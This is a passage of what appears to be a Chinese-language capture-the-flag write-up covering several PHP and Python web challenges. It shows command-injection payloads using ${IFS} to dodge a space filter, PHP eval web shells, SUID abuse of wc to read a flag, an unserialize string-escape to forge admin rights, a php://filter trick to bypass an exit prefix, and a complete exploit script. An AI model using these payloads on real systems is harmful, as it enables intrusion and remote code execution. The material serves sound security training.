invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Username must be at least 5 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Password must be at least 8 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>] = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_BCRYPT);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>]) &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$this</span>-&gt;users[<span class="variable">$username</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Authentication failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="variable">$x</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="title function_ invoke__">ceil</span>(<span class="variable">$length</span> / <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>)))), <span class="number">1</span>, <span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputValidator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$maxLength</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$maxLength</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;maxLength = <span class="variable">$maxLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="variable language_">$this</span>-&gt;maxLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Input exceeds maximum length of <span class="subst">&#123;$this-&gt;maxLength&#125;</span> characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ActionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$executor</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;executor = <span class="keyword">new</span> <span class="title class_">CommandExecutor</span>(<span class="variable">$logger</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;allowed_actions&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid action&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>));</span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;debug&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Debug mode enabled&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;generate&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Random string: &quot;</span> . <span class="title class_">StringUtils</span>::<span class="title function_ invoke__">generateRandomString</span>(<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unknown action&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$actionHandler</span> = <span class="keyword">new</span> <span class="title class_">ActionHandler</span>(<span class="variable">$config</span>, <span class="variable">$logger</span>);</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;input&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$actionHandler</span>-&gt;<span class="title function_ invoke__">handle</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line">    <span class="variable">$userManager</span> = <span class="keyword">new</span> <span class="title class_">UserManager</span>(<span class="variable">$logger</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">addUser</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">authenticate</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$logger</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;No action provided, running default logic&quot;</span>);</span><br><span class="line">&#125; [LOG] No action provided, running <span class="keyword">default</span> logic</span><br></pre></td></tr></table></figure><p>可以很快地找到<strong>关键代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，触发点在</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>));</span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了<code>input</code>参数不能出现空格，貌似没什么其他需要注意的地方了，直接<code>/?action=run&amp;input=ls$&#123;IFS&#125;/</code></p><p><code>cat$&#123;IFS&#125;/flag</code>，读不出东西，其他都可以读，也没什么特殊报错，<code>[LOG] Result: cat$&#123;IFS&#125;/flag</code></p><p>这个时候就要考虑<strong>SUID提权</strong>了，先写入<strong>后门</strong>，<code>echo$&#123;IFS&#125;&#39;&lt;?=eval($_POST[1]);?&gt;&#39;$&#123;IFS&#125;&gt;shell.php</code>，只能说很奇葩，<strong>双引号</strong>有问题，然后我弄<code>base64</code>的话也是有点问题，最后选择了无标签的，还能省空格</p><p>然后拿蚁剑连上，右键打开<strong>虚拟终端</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/var/www/html/wc</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br></pre></td></tr></table></figure><p>只有<strong>wc</strong>能试试了，去搜了一下真有，<a href="https://gtfobins.github.io/gtfobins/wc/#file-read">wc提权</a></p><p><code>./wc --files0-from &quot;/flag&quot;</code></p><h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape!"></a>Escape!</h2><p>大致功能就是注册、登录、写文件</p><p><code>waf.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$lists</span>=[<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;||&quot;</span>,<span class="string">&quot;&amp;&amp;&quot;</span>,<span class="string">&quot;select&quot;</span>,<span class="string">&quot;union&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$lists</span> <span class="keyword">as</span> <span class="variable">$list</span>)&#123;</span><br><span class="line">        <span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$list</span>,<span class="string">&quot;error&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#echo $c;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一看这个<code>waf</code>就知道是<strong>字符串逃逸</strong>了，看一下后面的死亡绕过，必须要拿到<code>isadmin=1</code>，因为有别的什么签名秘钥之类的操作，所以我们是登不上<code>admin</code>账号的，但我们可以通过<strong>用户名的字符串逃逸</strong>实现我们要的<code>isadmin=1</code>，有这个足矣</p><p>根据<code>User类</code>我们可以手搓一下它的<strong>序列化数据</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isadmin&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"></span><br><span class="line">因为我们不是真正的admin，所以要在用户名这里使isadmin=<span class="number">1</span>，即用户名后追加 <span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:1;&#125;，这里有21个字符，需要使用flag逃逸21次，变成下面的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:105:&quot;</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:1;&#125;&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isadmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">error替换后，后面的 <span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:0;&#125;就会逃逸出去，不起作用</span></span><br></pre></td></tr></table></figure><p>所以我们的用户名直接就是，<code>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code>，然后拿这个用户名去随便注册就可以了</p><p>同时，<code>dashboard.php</code>这里还有个<a href="https://xiaolong22333.top/archives/114/">php死亡绕过</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 示例：验证并读取 Cookie</span></span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">checkSignedCookie</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userData</span>) &#123;</span><br><span class="line">    <span class="comment">#echo $userData;</span></span><br><span class="line">    <span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$userData</span>);</span><br><span class="line">    <span class="comment">#var_dump($user);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;isadmin)&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]||<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token验证失败&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>filename=php://filter//convert.base64-decode/resource=/var/www/html/shell.php</code><br><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code>，作用就是将<code>&lt;?php exit(); ?&gt;.$content</code>进行<code>base64编码</code>后写入文件<code>shell.php</code>中，因为<code>phpexita</code>会被进行<code>base64解码</code>成<code>php</code>无法识别的内容而<strong>无法解析</strong>，但是<code>PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg==</code>的<code>base64解码</code>成<code>&lt;?php eval($_POST[1]);?&gt;</code>被<strong>php解析执行</strong></p><p>最后就是，连接木马，读取<code>flag</code>的操作了</p><p>官方给了自动化脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;register.php&quot;</span>, data=data)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_response = session.post(url+<span class="string">&quot;login.php&quot;</span>, data=data)</span><br><span class="line">    shell = &#123;<span class="string">&quot;filename&quot;</span>: <span class="string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/shell.php&quot;</span>,<span class="string">&quot;txt&quot;</span>:<span class="string">&quot;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==&quot;</span>&#125;</span><br><span class="line">    protected_response = session.post(url+<span class="string">&quot;dashboard.php&quot;</span>, data=shell)</span><br><span class="line">    response = requests.post(url+<span class="string">&quot;shell.php&quot;</span>, data=&#123;<span class="string">&quot;123&quot;</span>: <span class="string">&quot;system(&#x27;cat / flag&#x27;)&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://node2.anna.nssctf.cn:28932/&quot;</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure><h2 id="Message-in-a-Bottle"><a href="#Message-in-a-Bottle" class="headerlink" title="Message in a Bottle"></a>Message in a Bottle</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, template, run</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储留言的列表</span></span><br><span class="line">messages = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_message</span>(<span class="params">message</span>):</span><br><span class="line">    message_items = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;message-card&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-content&quot;&gt;<span class="subst">&#123;msg&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;small class=&quot;message-time&quot;&gt;#<span class="subst">&#123;idx + <span class="number">1</span>&#125;</span> - 刚刚&lt;/small&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> <span class="keyword">for</span> idx, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(message)])</span><br><span class="line"></span><br><span class="line">    board = <span class="string">f&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;简约留言板&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;link href=&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;d-flex justify-content-between align-items-center mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1 class=&quot;mb-0&quot;&gt;📝 简约留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;a </span></span><br><span class="line"><span class="string">                    href=&quot;/Clean&quot; </span></span><br><span class="line"><span class="string">                    class=&quot;btn btn-danger&quot;</span></span><br><span class="line"><span class="string">                    onclick=&quot;return confirm(&#x27;确定要清空所有留言吗？此操作不可恢复！&#x27;)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                    🗑️ 一键清理</span></span><br><span class="line"><span class="string">                &lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/submit&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;textarea </span></span><br><span class="line"><span class="string">                    name=&quot;message&quot; </span></span><br><span class="line"><span class="string">                    placeholder=&quot;输入payload暴打出题人&quot;</span></span><br><span class="line"><span class="string">                    required</span></span><br><span class="line"><span class="string">                &gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;button type=&quot;submit&quot; class=&quot;btn-custom&quot;&gt;发布留言&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;div class=&quot;message-list mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;d-flex justify-content-between align-items-center mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h4 class=&quot;mb-0&quot;&gt;最新留言（<span class="subst">&#123;<span class="built_in">len</span>(message)&#125;</span>条）&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    <span class="subst">&#123;<span class="string">f&#x27;&lt;small class=&quot;text-muted&quot;&gt;点击右侧清理按钮可清空列表&lt;/small&gt;&#x27;</span> <span class="keyword">if</span> message <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                <span 